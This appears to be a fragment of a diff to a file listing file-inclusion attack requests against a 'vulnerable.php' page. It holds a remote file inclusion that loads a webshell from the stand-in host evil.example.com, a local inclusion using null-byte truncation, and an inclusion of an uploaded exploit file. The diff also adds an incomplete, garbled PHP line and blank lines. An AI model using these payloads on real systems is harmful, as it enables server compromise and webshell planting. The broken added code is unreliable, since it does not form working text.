@@ -1,4 +1,10 @@
 
+<?php echo request
+
+
+
+
+
 /vulnerable.php?language=http://evil.example.com/webshell.txt?
 /vulnerable.php?language=C:\\notes.txt%00
 /vulnerable.php?language=C:\\ftp\\upload\\exploit
